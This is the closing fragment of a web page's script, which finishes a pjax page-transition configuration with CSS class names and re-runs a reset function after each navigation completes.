     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>